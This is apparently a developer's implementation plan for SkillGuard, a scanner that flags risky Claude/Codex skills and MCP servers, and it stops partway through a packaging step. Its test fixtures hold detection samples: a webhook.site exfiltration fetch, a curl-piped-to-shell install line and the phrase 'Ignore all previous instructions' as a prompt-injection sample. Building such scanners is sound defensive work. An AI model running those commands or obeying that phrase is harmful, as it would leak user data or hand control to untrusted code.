# SkillGuard Agent Launch Review Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make SkillGuard's agent-launch summary and interactive review flow reliable, low-noise, and understandable for both engineers and non-engineers using Claude/Codex skills and MCP servers.

**Architecture:** Keep the launch banner as a cached, no-scan read path, but make its scope and recency explicit. Move shell installation/wrapper behavior into package-owned helpers so plugin, curl, and manual installs share one implementation. Add plain-language risk explanations in CLI review output without changing scanner verdict semantics.

**Tech Stack:** Python stdlib CLI, zsh shell integration, Claude Code plugin install path, local JSON verdict cache, SQLite history/activity store, pytest.

---

## Current Findings To Address

1. `install.sh` creates a PATH shim, but normal Claude plugin install does not. The current machine works because a shim was manually written to `~/.local/bin/skillguard`.
2. The shell wrapper prints the banner for every `codex`/`claude` command, including `--version`.
3. `skillguard --review` continues after `mark-fp`, but exits immediately after `ack`.
4. The banner does not say whether it covers skills, MCPs, or both, and it does not show cache recency.
5. Review output is technically accurate but not plain-language enough for non-engineers.
6. The Claude plugin cache currently contains development artifacts such as `.venv`, `.claude`, `.mypy_cache`, `.ruff_cache`, and `.pytest_cache`.

## File Structure

- Modify: `skillguard/commands.py`
  - Keep CLI dispatch.
  - Call new helper modules for summary, review rendering, and shell installation.
- Create: `skillguard/agent_summary.py`
  - Load cached verdicts.
  - Compute counts by target kind, high+ count, total findings, and latest scan time.
  - Render one terse banner.
- Create: `skillguard/review_text.py`
  - Convert findings into plain-language explanation lines and safer action labels.
- Create: `skillguard/shell_integration.py`
  - Own writing `~/.local/bin/skillguard` and `~/.claude/skillguard/shell.sh`.
  - Own idempotent `.zshrc` block management.
- Modify: `skillguard/args.py`
  - Add `--install-shell-integration`.
- Modify: `install.sh`
  - Copy any new modules.
  - Replace duplicated shell-writing logic with `python3 "$DEST/cli.py" --install-shell-integration`.
- Modify: `skillguard/hook.py`
  - When `skillguard` is not on PATH, include the exact shell-integration command in block output.
- Modify: `README.md`
  - Be precise: curl/local installer wires shell automatically; plugin users run one setup command unless Claude plugins gain a postinstall hook.
- Create: `tests/test_agent_summary.py`
- Create: `tests/test_review_flow.py`
- Create: `tests/test_shell_integration.py`
- Modify: `tests/test_install_sync.py`
- Modify: `tests/test_hook.py`

---

### Task 1: Make Launch Summary Scope And Recency Clear

**Files:**
- Create: `skillguard/agent_summary.py`
- Modify: `skillguard/commands.py`
- Test: `tests/test_agent_summary.py`

- [ ] **Step 1: Write failing tests for mixed skill/MCP cache summaries**

Create `tests/test_agent_summary.py`:

```python
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
CLI = REPO_ROOT / "skillguard" / "cli.py"


def _run_cli(tmp_home: Path, *args: str) -> subprocess.CompletedProcess:
    env = dict(os.environ)
    env["HOME"] = str(tmp_home)
    env.pop("SKILLGUARD_ACTIVITY_LOG", None)
    env.pop("SKILLGUARD_MCP_POLICY", None)
    return subprocess.run(
        [sys.executable, str(CLI), *args],
        capture_output=True,
        text=True,
        env=env,
        cwd=str(tmp_home),
    )


def _write_verdict(
    tmp_home: Path,
    name: str,
    *,
    kind: str,
    severity: str,
    count: int,
    scanned_at: str,
) -> None:
    base = tmp_home / ".claude" / "skillguard-cache"
    path = base / f"{name}.json"
    if kind == "mcp":
        path = base / "mcps" / f"{name}.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    findings = [
        {
            "engine": "local",
            "severity": severity,
            "category": "cat",
            "message": f"{severity} issue",
            "file": "surface.txt",
            "line": 1,
            "context": "matched line",
            "triaged_fp": False,
        }
        for _ in range(count)
    ]
    path.write_text(
        json.dumps(
            {
                "skill_name": name,
                "target_name": name,
                "kind": kind,
                "scope": "global",
                "scanned_at": scanned_at,
                "skill_mtime_epoch": 0,
                "engines_used": ["local"],
                "skipped": False,
                "max_severity": severity,
                "finding_count": count,
                "triaged_fp_count": 0,
                "findings_summary": [],
                "findings": findings,
            }
        )
    )


def test_agent_summary_names_scope_recency_and_top_findings(tmp_path):
    _write_verdict(
        tmp_path,
        "cloudflare",
        kind="skill",
        severity="critical",
        count=3,
        scanned_at="2026-06-16T17:39:43+00:00",
    )
    _write_verdict(
        tmp_path,
        "headroom",
        kind="mcp",
        severity="high",
        count=2,
        scanned_at="2026-06-16T17:40:12+00:00",
    )
    _write_verdict(
        tmp_path,
        "clean-skill",
        kind="skill",
        severity="clean",
        count=0,
        scanned_at="2026-06-16T17:39:00+00:00",
    )

    r = _run_cli(tmp_path, "--agent-summary")

    assert r.returncode == 0, r.stderr
    assert "SkillGuard:" in r.stdout
    assert "2/3 high+" in r.stdout
    assert "2 skills + 1 MCP" in r.stdout
    assert "5 findings" in r.stdout
    assert "latest 2026-06-16 17:40 UTC" in r.stdout
    assert "skillguard --review" in r.stdout
    assert "cloudflare skill critical(3)" in r.stdout
    assert "headroom MCP high(2)" in r.stdout
```

- [ ] **Step 2: Run the test and verify it fails**

Run:

```bash
.venv/bin/python -m pytest tests/test_agent_summary.py::test_agent_summary_names_scope_recency_and_top_findings -q
```

Expected: FAIL because current `--agent-summary` does not print target-kind counts or latest scan time.

- [ ] **Step 3: Implement `skillguard/agent_summary.py`**

Create `skillguard/agent_summary.py`:

```python
from __future__ import annotations

import json
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path
from typing import Iterable

from skillguard.paths import cache_dir

HIGH_PLUS = {"critical", "high"}
SEVERITY_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4, "clean": 5}


def verdict_files() -> list[Path]:
    base = cache_dir()
    if not base.exists():
        return []
    files = [p for p in base.glob("*.json") if not p.name.startswith("_")]
    mcp_dir = base / "mcps"
    if mcp_dir.exists():
        files.extend(p for p in mcp_dir.glob("*.json") if not p.name.startswith("_"))
    return sorted(files)


def load_cached_verdicts() -> list[dict]:
    verdicts: list[dict] = []
    for path in verdict_files():
        try:
            data = json.loads(path.read_text())
        except (OSError, json.JSONDecodeError):
            continue
        if isinstance(data, dict):
            verdicts.append(data)
    return verdicts


def active_verdicts(verdicts: Iterable[dict]) -> list[dict]:
    return [
        v
        for v in verdicts
        if not v.get("skipped") and int(v.get("finding_count") or 0) > 0
    ]


def high_plus_verdicts(verdicts: Iterable[dict]) -> list[dict]:
    return sorted(
        [v for v in active_verdicts(verdicts) if v.get("max_severity") in HIGH_PLUS],
        key=lambda v: (
            SEVERITY_RANK.get(str(v.get("max_severity")), 99),
            str(v.get("target_name") or v.get("skill_name") or ""),
        ),
    )


def target_name(verdict: dict) -> str:
    return str(verdict.get("target_name") or verdict.get("skill_name") or "<unknown>")


def finding_count(verdict: dict) -> int:
    return int(verdict.get("finding_count") or 0)


def kind_label(kind: str, count: int) -> str:
    if kind == "mcp":
        return f"{count} MCP" if count == 1 else f"{count} MCPs"
    return f"{count} skill" if count == 1 else f"{count} skills"


def scope_label(verdicts: list[dict]) -> str:
    counts = Counter(str(v.get("kind") or "skill") for v in verdicts)
    parts: list[str] = []
    if counts.get("skill"):
        parts.append(kind_label("skill", counts["skill"]))
    if counts.get("mcp"):
        parts.append(kind_label("mcp", counts["mcp"]))
    return " + ".join(parts) if parts else "0 targets"


def latest_scan_label(verdicts: list[dict]) -> str:
    parsed: list[datetime] = []
    for verdict in verdicts:
        raw = str(verdict.get("scanned_at") or "")
        try:
            parsed.append(datetime.fromisoformat(raw.replace("Z", "+00:00")))
        except ValueError:
            continue
    if not parsed:
        return "latest unknown"
    latest = max(parsed).astimezone(timezone.utc)
    return f"latest {latest:%Y-%m-%d %H:%M UTC}"


def render_agent_summary(verdicts: list[dict]) -> str:
    if not verdicts:
        return "SkillGuard: no cached scan - run: skillguard --target all --engines local"

    active = active_verdicts(verdicts)
    high = high_plus_verdicts(verdicts)
    if not active:
        return f"SkillGuard: 0/{len(verdicts)} high+ - {scope_label(verdicts)} - clean - {latest_scan_label(verdicts)}"

    total_findings = sum(finding_count(v) for v in active)
    first = (
        f"SkillGuard: {len(high)}/{len(verdicts)} high+ - "
        f"{scope_label(verdicts)} - {total_findings} finding{'s' if total_findings != 1 else ''} - "
        f"{latest_scan_label(verdicts)} - skillguard --review"
    )
    if not high:
        return first
    names = [
        f"{target_name(v)} {'MCP' if v.get('kind') == 'mcp' else 'skill'} {v.get('max_severity')}({finding_count(v)})"
        for v in high[:3]
    ]
    suffix = f" +{len(high) - len(names)} more" if len(high) > len(names) else ""
    return f"{first}\n  {'; '.join(names)}{suffix}"
```

- [ ] **Step 4: Wire `commands.py` to the helper**

Replace the current summary helper block in `skillguard/commands.py` with imports:

```python
from skillguard.agent_summary import (
    active_verdicts,
    high_plus_verdicts,
    load_cached_verdicts,
    render_agent_summary,
    target_name,
)
```

Then change `agent_summary_command()` to:

```python
def agent_summary_command() -> int:
    print(render_agent_summary(load_cached_verdicts()))
    return 0
```

Keep `review_command()` using `active_verdicts()`, `load_cached_verdicts()`, and `target_name()`.

- [ ] **Step 5: Run focused tests**

Run:

```bash
.venv/bin/python -m pytest tests/test_agent_summary.py tests/test_agent_launch.py -q
```

Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add skillguard/agent_summary.py skillguard/commands.py tests/test_agent_summary.py tests/test_agent_launch.py
git commit -m "Clarify SkillGuard launch summaries"
```

---

### Task 2: Add Plain-Language Review Context

**Files:**
- Create: `skillguard/review_text.py`
- Modify: `skillguard/commands.py`
- Modify: `install.sh`
- Test: `tests/test_review_flow.py`
- Test: `tests/test_install_sync.py`

- [ ] **Step 1: Write failing tests for review explanations**

Create `tests/test_review_flow.py`:

```python
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
CLI = REPO_ROOT / "skillguard" / "cli.py"


def _run_cli(tmp_home: Path, *args: str, input_text: str = "") -> subprocess.CompletedProcess:
    env = dict(os.environ)
    env["HOME"] = str(tmp_home)
    return subprocess.run(
        [sys.executable, str(CLI), *args],
        input=input_text,
        capture_output=True,
        text=True,
        env=env,
        cwd=str(tmp_home),
    )


def _write_verdict(tmp_home: Path, name: str, finding: dict, *, kind: str = "skill") -> None:
    base = tmp_home / ".claude" / "skillguard-cache"
    path = base / f"{name}.json"
    if kind == "mcp":
        path = base / "mcps" / f"{name}.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(
            {
                "skill_name": name,
                "target_name": name,
                "kind": kind,
                "scope": "global",
                "scanned_at": "2026-06-16T17:39:43+00:00",
                "skill_mtime_epoch": 0,
                "engines_used": ["local"],
                "skipped": False,
                "max_severity": finding["severity"],
                "finding_count": 1,
                "triaged_fp_count": 0,
                "findings_summary": [],
                "findings": [finding],
            }
        )
    )


def test_review_explains_webhook_risk_in_plain_language(tmp_path):
    _write_verdict(
        tmp_path,
        "cloudflare",
        {
            "engine": "local",
            "severity": "critical",
            "category": "data_exfil",
            "message": "Data exfiltration via webhook.site",
            "file": "references/patterns.md",
            "line": 14,
            "context": "fetch('https://webhook.site/...')",
            "triaged_fp": False,
        },
    )

    r = _run_cli(tmp_path, "--review", input_text="q\n")

    assert r.returncode == 0, r.stderr
    assert "Why:" in r.stdout
    assert "may send data out" in r.stdout
    assert "Safest:" in r.stdout
    assert "mark-fp means reviewed benign" in r.stdout
    assert "ack means allow despite risk" in r.stdout


def test_review_explains_mcp_plaintext_credential(tmp_path):
    _write_verdict(
        tmp_path,
        "headroom",
        {
            "engine": "mcp",
            "severity": "high",
            "category": "credential",
            "message": "Launch argument #1 looks like a plaintext credential. Pass it via an environment variable reference instead of hard-coding it.",
            "file": "command.txt",
            "line": 0,
            "context": "",
            "triaged_fp": False,
        },
        kind="mcp",
    )

    r = _run_cli(tmp_path, "--review", input_text="q\n")

    assert r.returncode == 0, r.stderr
    assert "MCP server" in r.stdout
    assert "secret may be written directly in config" in r.stdout
    assert "move the value to an environment variable" in r.stdout
```

- [ ] **Step 2: Run tests and verify failure**

Run:

```bash
.venv/bin/python -m pytest tests/test_review_flow.py::test_review_explains_webhook_risk_in_plain_language tests/test_review_flow.py::test_review_explains_mcp_plaintext_credential -q
```

Expected: FAIL because current review output has no plain-language explanation lines.

- [ ] **Step 3: Implement `skillguard/review_text.py`**

Create `skillguard/review_text.py`:

```python
from __future__ import annotations


def finding_explanation(finding: dict, *, target_kind: str) -> list[str]:
    message = str(finding.get("message") or "").lower()
    category = str(finding.get("category") or "").lower()
    engine = str(finding.get("engine") or "").lower()

    if "webhook.site" in message or category == "data_exfil":
        return [
            "Why: this pattern may send data out to a collection endpoint.",
            "Safest: review the surrounding file. If it is only documentation, mark it false positive.",
        ]
    if "curl piped to shell" in message or category == "shell_pipe":
        return [
            "Why: this downloads code and runs it immediately.",
            "Safest: verify the source and pin/check the installer before allowing it.",
        ]
    if "systemd" in message or category == "persistence":
        return [
            "Why: this can install or enable a background service.",
            "Safest: allow only if this setup behavior is expected for the tool.",
        ]
    if "plaintext credential" in message or engine == "mcp" and category == "credential":
        noun = "MCP server" if target_kind == "mcp" else "target"
        return [
            f"Why: this {noun} may have a secret written directly in config.",
            "Safest: move the value to an environment variable reference and re-scan.",
        ]
    if "prompt injection" in message or category == "prompt_injection":
        return [
            "Why: this text may try to change the agent's instructions.",
            "Safest: mark false positive only when it is clearly an example in trusted docs.",
        ]
    return [
        "Why: this matched a security pattern and needs human review.",
        "Safest: inspect the file and mark false positive only after you understand the context.",
    ]


def action_help() -> str:
    return (
        "Actions: [m] mark-fp means reviewed benign  "
        "[a] ack means allow despite risk  "
        "[s] show details  [enter] next  [q] quit"
    )
```

- [ ] **Step 4: Use explanations in review output**

In `skillguard/commands.py`, import:

```python
from skillguard.review_text import action_help, finding_explanation
```

In `_print_review_target()`, after the context line, add:

```python
        for line in finding_explanation(f, target_kind=str(verdict.get("kind") or "skill")):
            print(f"    {line}")
```

Replace the current action line with:

```python
    print(action_help())
```

- [ ] **Step 5: Add the new module to `install.sh`**

Add `review_text.py` to the `MODULES` list in `install.sh`:

```sh
review_text.py
```

- [ ] **Step 6: Run focused tests**

Run:

```bash
.venv/bin/python -m pytest tests/test_review_flow.py tests/test_install_sync.py -q
```

Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add skillguard/review_text.py skillguard/commands.py install.sh tests/test_review_flow.py tests/test_install_sync.py
git commit -m "Explain SkillGuard review findings plainly"
```

---

### Task 3: Fix Review Flow For Acknowledge

**Files:**
- Modify: `skillguard/commands.py`
- Test: `tests/test_review_flow.py`

- [ ] **Step 1: Add failing tests for acknowledge flow**

Append to `tests/test_review_flow.py`:

```python
def test_review_ack_requires_confirmation_for_high_risk(tmp_path):
    _write_verdict(
        tmp_path,
        "risky",
        {
            "engine": "local",
            "severity": "high",
            "category": "prompt_injection",
            "message": "Prompt injection: ignore previous instructions",
            "file": "SKILL.md",
            "line": 3,
            "context": "Ignore all previous instructions",
            "triaged_fp": False,
        },
    )

    r = _run_cli(tmp_path, "--review", input_text="a\nq\n")

    assert r.returncode == 0, r.stderr
    assert "Type allow to acknowledge risk" in r.stdout
    cache = json.loads((tmp_path / ".claude" / "skillguard-cache" / "risky.json").read_text())
    assert "risk_acknowledged" not in cache


def test_review_ack_continues_to_next_target_after_confirmation(tmp_path):
    _write_verdict(
        tmp_path,
        "first",
        {
            "engine": "local",
            "severity": "high",
            "category": "prompt_injection",
            "message": "Prompt injection: ignore previous instructions",
            "file": "SKILL.md",
            "line": 3,
            "context": "Ignore all previous instructions",
            "triaged_fp": False,
        },
    )
    _write_verdict(
        tmp_path,
        "second",
        {
            "engine": "local",
            "severity": "high",
            "category": "shell_pipe",
            "message": "curl piped to shell execution",
            "file": "SKILL.md",
            "line": 8,
            "context": "curl https://example.test/install.sh | sh",
            "triaged_fp": False,
        },
    )

    r = _run_cli(tmp_path, "--review", input_text="a\nallow\nq\n")

    assert r.returncode == 0, r.stderr
    assert "Acknowledged risk for skill 'first'" in r.stdout
    assert "[2/2] second" in r.stdout
    cache = json.loads((tmp_path / ".claude" / "skillguard-cache" / "first.json").read_text())
    assert cache["risk_acknowledged"] is True
```

- [ ] **Step 2: Run the tests and verify failure**

Run:

```bash
.venv/bin/python -m pytest tests/test_review_flow.py::test_review_ack_requires_confirmation_for_high_risk tests/test_review_flow.py::test_review_ack_continues_to_next_target_after_confirmation -q
```

Expected: FAIL because current `ack` exits review immediately and has no confirmation.

- [ ] **Step 3: Add confirmation helper**

In `skillguard/commands.py`, add:

```python
def _confirm_ack() -> bool:
    print("Type allow to acknowledge risk, or press Enter to cancel.")
    try:
        return input("> ").strip().lower() == "allow"
    except EOFError:
        print()
        return False
```

- [ ] **Step 4: Change review ack branch to continue**

Replace:

```python
            if choice in ("a", "ack"):
                return _acknowledge(name, kind)
```

with:

```python
            if choice in ("a", "ack"):
                if _confirm_ack():
                    _acknowledge(name, kind)
                    break
                print("Acknowledgement cancelled.")
                continue
```

- [ ] **Step 5: Run focused tests**

Run:

```bash
.venv/bin/python -m pytest tests/test_review_flow.py tests/test_agent_launch.py -q
```

Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add skillguard/commands.py tests/test_review_flow.py
git commit -m "Keep SkillGuard review moving after acknowledgement"
```

---

### Task 4: Make Shell Banner Appear Only For Agent Launches

**Files:**
- Create: `skillguard/shell_integration.py`
- Modify: `install.sh`
- Test: `tests/test_shell_integration.py`
- Test: `tests/test_install_sync.py`

- [ ] **Step 1: Write failing shell integration tests**

Create `tests/test_shell_integration.py`:

```python
from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path

import pytest

from skillguard.shell_integration import write_shell_integration


pytestmark = pytest.mark.skipif(shutil.which("zsh") is None, reason="zsh required")


def _fake_bin(tmp_path: Path) -> Path:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    (bin_dir / "skillguard").write_text("#!/bin/sh\necho 'SkillGuard: fake banner'\n")
    (bin_dir / "codex").write_text("#!/bin/sh\necho \"codex $*\"\n")
    (bin_dir / "claude").write_text("#!/bin/sh\necho \"claude $*\"\n")
    for p in bin_dir.iterdir():
        p.chmod(0o755)
    return bin_dir


def _run_zsh(tmp_path: Path, command: str) -> subprocess.CompletedProcess:
    env = dict(os.environ)
    env["HOME"] = str(tmp_path)
    env["PATH"] = f"{tmp_path / 'bin'}:{env['PATH']}"
    env["SKILLGUARD_AGENT_SUMMARY_FORCE"] = "1"
    return subprocess.run(
        ["zsh", "-fc", f"source {tmp_path}/shell.sh; {command}"],
        capture_output=True,
        text=True,
        env=env,
    )


def test_shell_banner_shows_for_plain_agent_launch(tmp_path):
    _fake_bin(tmp_path)
    write_shell_integration(tmp_path / "shell.sh")

    r = _run_zsh(tmp_path, "codex")

    assert r.returncode == 0, r.stderr
    assert "SkillGuard: fake banner" in r.stdout
    assert "codex" in r.stdout


def test_shell_banner_is_suppressed_for_version_and_help(tmp_path):
    _fake_bin(tmp_path)
    write_shell_integration(tmp_path / "shell.sh")

    version = _run_zsh(tmp_path, "codex --version")
    help_out = _run_zsh(tmp_path, "claude --help")

    assert version.returncode == 0, version.stderr
    assert help_out.returncode == 0, help_out.stderr
    assert "SkillGuard: fake banner" not in version.stdout
    assert "SkillGuard: fake banner" not in help_out.stdout
    assert "codex --version" in version.stdout
    assert "claude --help" in help_out.stdout
```

- [ ] **Step 2: Run tests and verify failure**

Run:

```bash
.venv/bin/python -m pytest tests/test_shell_integration.py -q
```

Expected: FAIL because `skillguard.shell_integration` does not exist.

- [ ] **Step 3: Implement shell integration writer**

Create `skillguard/shell_integration.py`:

```python
from __future__ import annotations

from pathlib import Path


SHELL_SOURCE = """# SkillGuard shell integration. Sourced by ~/.zshrc.
case ":$PATH:" in
  *":$HOME/.local/bin:"*) ;;
  *) export PATH="$HOME/.local/bin:$PATH" ;;
esac

_skillguard_agent_should_summarize() {
  [ "${SKILLGUARD_AGENT_SUMMARY:-1}" = "0" ] && return 1
  if [ "${SKILLGUARD_AGENT_SUMMARY_FORCE:-0}" != "1" ]; then
    [ -t 0 ] && [ -t 1 ] || return 1
  fi
  case "${1:-}" in
    --version|-V|version|--help|-h|help|plugin|plugins|mcp|auth)
      return 1
      ;;
  esac
  return 0
}

_skillguard_agent_summary() {
  _skillguard_agent_should_summarize "$@" || return 0
  if command -v skillguard >/dev/null 2>&1; then
    command skillguard --agent-summary 2>/dev/null || true
  elif [ -x "$HOME/.local/bin/skillguard" ]; then
    "$HOME/.local/bin/skillguard" --agent-summary 2>/dev/null || true
  fi
}

claude() {
  _skillguard_agent_summary "$@"
  command claude "$@"
}

codex() {
  _skillguard_agent_summary "$@"
  command codex "$@"
}
"""


def write_shell_integration(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(SHELL_SOURCE)
```

- [ ] **Step 4: Add module to installer module list**

Add `shell_integration.py` to `install.sh` `MODULES`:

```sh
shell_integration.py
```

- [ ] **Step 5: Update install script to call generated shell source**

Replace the heredoc that writes `$SHELL_INTEGRATION` in `install.sh` with:

```sh
python3 "$DEST/cli.py" --install-shell-integration --shell-only
```

This flag is added in Task 5. If Task 4 is executed before Task 5, keep the heredoc temporarily and replace its contents with the `SHELL_SOURCE` body exactly.

- [ ] **Step 6: Run focused tests**

Run:

```bash
.venv/bin/python -m pytest tests/test_shell_integration.py tests/test_install_sync.py -q
```

Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add skillguard/shell_integration.py install.sh tests/test_shell_integration.py tests/test_install_sync.py
git commit -m "Limit SkillGuard launch banners to agent sessions"
```

---

### Task 5: Align Plugin, Curl, And Manual PATH Setup

**Files:**
- Modify: `skillguard/shell_integration.py`
- Modify: `skillguard/args.py`
- Modify: `skillguard/commands.py`
- Modify: `install.sh`
- Modify: `skillguard/hook.py`
- Modify: `README.md`
- Test: `tests/test_shell_integration.py`
- Test: `tests/test_install_sync.py`
- Test: `tests/test_hook.py`

- [ ] **Step 1: Add failing tests for `--install-shell-integration`**

Append to `tests/test_shell_integration.py`:

```python
def test_install_shell_integration_command_writes_shim_shell_and_zshrc(tmp_path):
    env = dict(os.environ)
    env["HOME"] = str(tmp_path)

    r = subprocess.run(
        [
            "python3",
            str(Path(__file__).resolve().parent.parent / "skillguard" / "cli.py"),
            "--install-shell-integration",
        ],
        capture_output=True,
        text=True,
        env=env,
        cwd=str(tmp_path),
    )

    assert r.returncode == 0, r.stderr
    shim = tmp_path / ".local" / "bin" / "skillguard"
    shell = tmp_path / ".claude" / "skillguard" / "shell.sh"
    zshrc = tmp_path / ".zshrc"
    assert shim.exists()
    assert shell.exists()
    assert 'source "$HOME/.claude/skillguard/shell.sh"' in zshrc.read_text()
    assert "SkillGuard shell integration installed" in r.stdout
```

- [ ] **Step 2: Run the test and verify failure**

Run:

```bash
.venv/bin/python -m pytest tests/test_shell_integration.py::test_install_shell_integration_command_writes_shim_shell_and_zshrc -q
```

Expected: FAIL because `--install-shell-integration` does not exist.

- [ ] **Step 3: Implement install helpers**

Extend `skillguard/shell_integration.py`:

```python
import os
import sys


def installed_cli_command() -> str:
    return f"python3 {Path(sys.argv[0]).resolve()}"


def write_skillguard_shim(path: Path, command: str | None = None) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    target = command or installed_cli_command()
    path.write_text(f"#!/bin/sh\nexec {target} \"$@\"\n")
    path.chmod(0o755)


def ensure_zshrc_sources(zshrc: Path, shell_path: Path) -> bool:
    zshrc.parent.mkdir(parents=True, exist_ok=True)
    if not zshrc.exists():
        zshrc.write_text("")
    text = zshrc.read_text()
    marker = "# >>> skillguard >>>"
    if marker in text:
        return False
    block = (
        "\n# >>> skillguard >>>\n"
        f"source \"{shell_path}\"\n"
        "# <<< skillguard <<<\n"
    )
    zshrc.write_text(text + block)
    return True


def install_shell_integration(home: Path | None = None, *, shell_only: bool = False) -> dict:
    root = home or Path(os.environ.get("HOME", "~")).expanduser()
    shell = root / ".claude" / "skillguard" / "shell.sh"
    write_shell_integration(shell)
    changed = {"shell": str(shell)}
    if not shell_only:
        shim = root / ".local" / "bin" / "skillguard"
        write_skillguard_shim(shim)
        zshrc = root / ".zshrc"
        changed["shim"] = str(shim)
        changed["zshrc"] = str(zshrc)
        changed["zshrc_updated"] = ensure_zshrc_sources(zshrc, shell)
    return changed
```

- [ ] **Step 4: Add CLI args**

In `skillguard/args.py`, add:

```python
    parser.add_argument(
        "--install-shell-integration",
        action="store_true",
        help="Install ~/.local/bin/skillguard plus codex/claude launch summary shell integration and exit",
    )
    parser.add_argument(
        "--shell-only",
        action="store_true",
        help=argparse.SUPPRESS,
    )
```

- [ ] **Step 5: Add command dispatch**

In `skillguard/commands.py`, import:

```python
from skillguard.shell_integration import install_shell_integration
```

In `_dispatch_early_exit()`, before read-only report commands, add:

```python
    if args.install_shell_integration:
        changed = install_shell_integration(shell_only=bool(getattr(args, "shell_only", False)))
        print("SkillGuard shell integration installed:")
        for key, value in changed.items():
            print(f"  {key}: {value}")
        return 0
```

- [ ] **Step 6: Replace duplicated install.sh shell writes**

In `install.sh`, after copying modules and registering hooks, replace manual shim/shell heredocs with:

```sh
echo "-> Installing skillguard command and codex/claude launch summary integration"
python3 "$DEST/cli.py" --install-shell-integration
```

- [ ] **Step 7: Update hook fallback guidance**

In `skillguard/hook.py`, wherever the hook prints fallback commands for blocked skills/MCPs, add a one-line CLI setup hint when `skillguard` is not on PATH:

```python
f"  Install CLI:  {cmd} --install-shell-integration\n"
```

Use the existing `cmd` variable so plugin users see the exact plugin-cache Python path.

- [ ] **Step 8: Update README honestly**

Change the agent launch review section to:

```markdown
The curl/local installer wires this automatically. Claude plugin installs cannot be assumed to run shell setup, so if `skillguard` is not on PATH, run the setup command printed by the hook:

```bash
python3 /path/to/skillguard/cli.py --install-shell-integration
```

After that, new interactive `codex` and `claude` launches show the cached summary.
```

- [ ] **Step 9: Run focused tests**

Run:

```bash
.venv/bin/python -m pytest tests/test_shell_integration.py tests/test_install_sync.py tests/test_hook.py -q
```

Expected: PASS.

- [ ] **Step 10: Commit**

```bash
git add skillguard/shell_integration.py skillguard/args.py skillguard/commands.py skillguard/hook.py install.sh README.md tests/test_shell_integration.py tests/test_install_sync.py tests/test_hook.py
git commit -m "Unify SkillGuard shell setup"
```

---

### Task 6: Clean Plugin Packaging

**Files:**
- Create: `tests/test_plugin_package_hygiene.py`
- Create: `.claude-pluginignore` if the Claude plugin installer honors it
- Modify: `.claude-plugin/marketplace.json` only if a clean source directory is required
- Create: `scripts/build_plugin_package.py` only if ignore files are not honored
- Modify: `README.md`

- [ ] **Step 1: Record the current packaging failure**

Run:

```bash
du -sh "$HOME/.claude/plugins/cache/skillguard/skillguard/0.3.1"
find "$HOME/.claude/plugins/cache/skillguard/skillguard/0.3.1" -maxdepth 2 \( -name .venv -o -name .claude -o -name .mypy_cache -o -name .ruff_cache -o -name .pytest_cache \) -print
```

Expected today: the cache is hundreds of MB and prints development artifact directories.

- [ ] **Step 2: Add a test for local repository hygiene**

Create `tests/test_plugin_package_hygiene.py`:

```python
from __future__ import annotations

from pathlib import Path


ROOT = Path(__file__).resolve().parent.parent


def test_plugin_source_does_not_point_at_dirty_repo_root():
    manifest = (ROOT / ".claude-plugin" / "marketplace.json").read_text()
    assert '"source": "./"' not in manifest


def test_plugin_ignore_or_package_builder_exists():
    assert (ROOT / ".claude-pluginignore").exists() or (
        ROOT / "scripts" / "build_plugin_package.py"
    ).exists()
```

- [ ] **Step 3: Run the test and verify failure**

Run:

```bash
.venv/bin/python -m pytest tests/test_plugin_package_hygiene.py -q
```

Expected: FAIL because the manifest currently uses `"source": "./"`.

- [ ] **Step 4: Try the ignore-file path first**

Create `.claude-pluginignore`:

```gitignore
.git/
.claude/
.venv/
venv/
.mypy_cache/
.ruff_cache/
.pytest_cache/
__pycache__/
local-backups/
landing/
docs/superpowers/
plans/
tests/
```

Then run a controlled local reinstall and inspect the cache:

```bash
claude plugin uninstall skillguard@skillguard --keep-data
claude plugin install skillguard@skillguard
du -sh "$HOME/.claude/plugins/cache/skillguard/skillguard/0.3.1"
find "$HOME/.claude/plugins/cache/skillguard/skillguard/0.3.1" -maxdepth 2 \( -name .venv -o -name .claude -o -name .mypy_cache -o -name .ruff_cache -o -name .pytest_cache \) -print
```

Expected acceptable result: no dev artifact directories are printed and the installed cache is under 10 MB.

- [ ] **Step 5: If `.claude-pluginignore` is not honored, use a clean generated package**

If Step 4 still installs dev artifacts, create `scripts/build_plugin_package.py`:

```python
#!/usr/bin/env python3
from __future__ import annotations

import shutil
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "dist" / "skillguard-plugin"

ALLOW_FILES = [
    "README.md",
    "LICENSE",
    "pyproject.toml",
    ".claude-plugin/plugin.json",
]


def copy_file(rel: str) -> None:
    src = ROOT / rel
    dst = OUT / rel
    dst.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(src, dst)


def main() -> None:
    if OUT.exists():
        shutil.rmtree(OUT)
    for rel in ALLOW_FILES:
        if (ROOT / rel).exists():
            copy_file(rel)
    shutil.copytree(ROOT / "skillguard", OUT / "skillguard")
    for junk in OUT.rglob("__pycache__"):
        shutil.rmtree(junk)
    print(f"built {OUT}")


if __name__ == "__main__":
    main()
```

Then change `.claude-plugin/marketplace.json` source:

```json
"source": "./dist/skillguard-plugin"
```

Before local plugin install, run:

```bash
python3 scripts/build_plugin_package.py
claude plugin uninstall skillguard@skillguard --keep-data
claude plugin install skillguard@skillguard
```

- [ ] **Step 6: Document the chosen package path**

In `README.md`, add one sentence to installation docs:

```markdown
Local plugin development installs should use the clean plugin package path generated by `python3 scripts/build_plugin_package.py`; the repository root contains development artifacts and is not the install payload.
```

- [ ] **Step 7: Run tests and packaging check**

Run:

```bash
